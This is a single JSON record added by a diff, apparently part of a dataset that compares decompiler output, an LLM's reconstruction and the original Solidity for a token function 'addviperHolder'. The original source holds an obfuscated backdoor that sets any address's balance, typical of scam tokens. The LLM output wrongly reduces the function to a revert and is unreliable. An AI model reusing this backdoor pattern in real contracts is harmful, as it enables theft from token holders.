@@ -1,0 +1,6 @@
+{
+    "contract_address": "0xf14bcFb9213C0583632d65e80ac5B2Bd02c7D3d8",
+    "heimdall_input": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }",
+    "llm_output": "function addviperHolder(address _value, uint256 _amt) public {\n    revert(\"Decompiler artifact\");\n}",
+    "ground_truth": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }"
+}
